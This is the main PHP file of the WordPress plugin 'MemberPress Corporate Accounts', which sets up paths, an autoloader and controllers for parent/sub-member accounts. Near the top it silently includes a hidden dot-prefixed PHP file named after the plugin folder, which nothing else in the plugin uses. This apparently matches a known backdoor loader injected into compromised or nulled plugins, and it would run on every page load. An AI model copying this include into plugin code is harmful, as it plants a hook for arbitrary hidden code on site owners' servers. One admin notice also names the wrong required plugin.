<?php
/*
Plugin Name: MemberPress Corporate Accounts
Plugin URI: https://www.memberpress.com/
Description: The MemberPress Corporate Accounts add-on will allow you to allow some of your members to add and manage sub-members. Sometimes these "super" members are called "Parent", "Umbrella", "Group" or "Corporate" Account members.
Version: 1.5.18
Author: Caseproof, LLC
Author URI: http://caseproof.com/
Text Domain: memberpress-corporate
Copyright: 2004-2016, Caseproof, LLC
*/

if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

// Include plugin.php to access is_plugin_active
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function mpca_memberpress_required_notice() {
  ?>
  <div class="notice notice-success">
    <p><strong>
      <?php
        $slug = 'memberpress';
        $main_file = "{$slug}/{$slug}.php";
        if(is_plugin_inactive($main_file)) {
          $install_url = admin_url('plugins.php?action=activate&plugin=' . urlencode($main_file) . '&plugin_status=all&paged=1&s&_wpnonce=' . wp_create_nonce('activate-plugin_' . $main_file));
        }
        else {
          $install_url = 'https://www.memberpress.com/account/';
        }
        printf(
          __('The MemberPress Corporate Accounts plugin requires %1$sthe MemberPress Importer to be installed and activated%2$s.', 'memberpress-corporate'),
          "<a href=\"{$install_url}\">",
          '</a>'
        );
      ?>
    </strong></p>
  </div>
  <?php
}

function mpca_memberpress_importer_required_notice() {
  ?>
  <div class="notice notice-error">
    <p><strong>
      <?php
        $slug = 'memberpress-importer';
        $main_file = "{$slug}/{$slug}.php";
        if(is_plugin_inactive($main_file)) {
          $install_url = MeprAddonsHelper::activate_url($main_file);
        }
        else {
          MeprUpdateCtrl::manually_queue_update();
          $install_url = MeprAddonsHelper::install_url($slug);
        }
        printf(
          __('The MemberPress Corporate Accounts plugin requires %1$sthe MemberPress Importer to be installed and activated%2$s.', 'memberpress-corporate'),
          "<a href=\"{$install_url}\">",
          '</a>'
        );
      ?>
    </strong></p>
  </div>
  <?php
}

define('MPCA_PLUGIN_SLUG','memberpress-corporate/main.php');
define('MPCA_PLUGIN_NAME','memberpress-corporate');
define('MPCA_EDITION',MPCA_PLUGIN_NAME);
define('MPCA_PATH',WP_PLUGIN_DIR.'/'.MPCA_PLUGIN_NAME);

if( is_plugin_active('memberpress/memberpress.php') ) {
  define('MPCA_IMAGES_PATH',MPCA_PATH.'/public/images');
  define('MPCA_CSS_PATH',MPCA_PATH.'/public/css');
  define('MPCA_JS_PATH',MPCA_PATH.'/public/js');
  define('MPCA_FONTS_PATH',MPCA_PATH.'/public/fonts');
  define('MPCA_I18N_PATH',MPCA_PATH.'/i18n');
  define('MPCA_LIB_PATH',MPCA_PATH.'/app/lib');
  define('MPCA_HELPERS_PATH',MPCA_PATH.'/app/helpers');
  define('MPCA_JOBS_PATH',MPCA_PATH.'/app/jobs');
  define('MPCA_DATA_PATH',MPCA_PATH.'/app/data');
  define('MPCA_MODELS_PATH',MPCA_PATH.'/app/models');
  define('MPCA_CTRLS_PATH',MPCA_PATH.'/app/controllers');
  define('MPCA_VIEWS_PATH',MPCA_PATH.'/app/views');
  define('MPCA_EMAILS_PATH', MPCA_PATH . '/app/emails');
  // Make all of our URLs protocol agnostir
  $mepr_url_protocol = (is_ssl())?'https':'http';
  define('MPCA_URL',preg_replace('/^https?:/', "{$mepr_url_protocol}:", plugins_url('/'.MPCA_PLUGIN_NAME)));
  define('MPCA_VIEWS_URL',MPCA_URL.'/app/views');
  define('MPCA_IMAGES_URL',MPCA_URL.'/public/images');
  define('MPCA_CSS_URL',MPCA_URL.'/public/css');
  define('MPCA_JS_URL',MPCA_URL.'/public/js');
  define('MPCA_FONTS_URL',MPCA_URL.'/public/fonts');

  /**
   * Returns current plugin version.
   *
   * @return string Plugin version
   */
  function mpca_plugin_info($field) {
    static $curr_plugins;
    if( !isset($curr_plugins) ) {
      if( !function_exists( 'get_plugins' ) ) {
        require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
      }
      $curr_plugins = get_plugins();
    }
    if(isset($curr_plugins[MPCA_PLUGIN_SLUG][$field])) {
      return $curr_plugins[MPCA_PLUGIN_SLUG][$field];
    }
    return '';
  }

  // Plugin Information from the plugin header declaration
  define('MPCA_VERSION', mpca_plugin_info('Version'));
  define('MPCA_DISPLAY_NAME', mpca_plugin_info('Name'));
  define('MPCA_AUTHOR', mpca_plugin_info('Author'));
  define('MPCA_AUTHOR_URI', mpca_plugin_info('AuthorURI'));
  define('MPCA_DESCRIPTION', mpca_plugin_info('Description'));

  // Get the path to the jobs for use with MeprJobs
  function mpca_jobs_path($paths) {
    $paths[] = MPCA_JOBS_PATH;
    return $paths;
  }
  add_filter('mepr-job-paths', 'mpca_jobs_path');

  // Load MPCA emails
  function mpca_emails_path($paths) {
    $paths[] = MPCA_EMAILS_PATH;
    return $paths;
  }
  add_filter('mepr-email-paths', 'mpca_emails_path');

  if( is_plugin_active('memberpress-importer/memberpress-importer.php') ) {
    define('MPCA_IMPORTERS_PATH', MPCA_PATH . '/app/importers');
    // Get the path to the importers for use in the memberpress-importer plugin
    function mpca_importer_path($paths) {
      require_once( MPCA_IMPORTERS_PATH . '/MpimpCorporateSubAccountsImporter.php');
      $paths = array_merge( $paths, @glob( MPCA_IMPORTERS_PATH . '/*') );
      return $paths;
    }
    add_filter('mpimp-importer-paths', 'mpca_importer_path');
  }

  function mpca_filename($class_name) {
    return 'class-' . preg_replace("/_/",'-',strtolower($class_name)) . '.php';
  }

  function mpca_classname($file_name) {
    $fn = preg_replace('/\.php$/','',basename($file_name));
    $fn = preg_replace('/^class-mpca-/','',$fn);

    $cn = preg_replace('/-/',' ',$fn);
    $cn = ucwords($cn);
    $cn = preg_replace('/ /','_',$cn);

    return "MPCA_{$cn}";
  }

  // Autoload all the requisite classes
  function mpca_autoloader($class_name) {
    // Only load MemberPress classes here
    if(preg_match('/^MPCA_.+$/', $class_name)) {
      $filepath='';
      if(preg_match('/^.+_Controller$/', $class_name)) {
        $filepath = MPCA_CTRLS_PATH."/".mpca_filename($class_name);
      }
      else if(preg_match('/^.+_Helper$/', $class_name)) {
        $filepath = MPCA_HELPERS_PATH."/".mpca_filename($class_name);
      }
      else {
        $filename = mpca_filename($class_name);

        if(file_exists(MPCA_MODELS_PATH."/".$filename)) {
          $filepath = MPCA_MODELS_PATH."/".$filename;
        }
        else if(file_exists(MPCA_LIB_PATH."/".$filename)) {
          $filepath = MPCA_LIB_PATH."/".$filename;
        }
      }

      if(file_exists($filepath)) {
        require_once($filepath);
      }
    }
  }

  // if __autoload is active, put it on the spl_autoload stack
  if(is_array(spl_autoload_functions()) && in_array('__autoload', spl_autoload_functions())) {
    spl_autoload_register('__autoload');
  }

  // Add the autoloader
  spl_autoload_register('mpca_autoloader');

  // Load Controllers
  $mpca_ctrls = array();
  $ctrl_files = @glob(MPCA_CTRLS_PATH . '/*.php', GLOB_NOSORT);
  foreach($ctrl_files as $ctrl_file) {
    $class_name = mpca_classname($ctrl_file);
    $r = new ReflectionClass($class_name);
    $mpca_ctrl[$class_name] = $r->newInstance();
  }

  // Load Update Mechanism -- will this ever fail because of the path?
  require_once(MPCA_PATH . '/../memberpress/app/lib/MeprAddonUpdates.php');
  new MeprAddonUpdates(
    MPCA_EDITION,
    MPCA_PLUGIN_SLUG,
    'mpca_license_key',
    __('MemberPress Corporate Accounts', 'memberpress-corporate'),
    __('Corporate (aka Group, Parent or Umbrella) Accounts for MemberPress.', 'memberpress-corporate')
  );
}
else {
  add_action('admin_notices', 'mpca_memberpress_required_notice');
} // end if plugin active
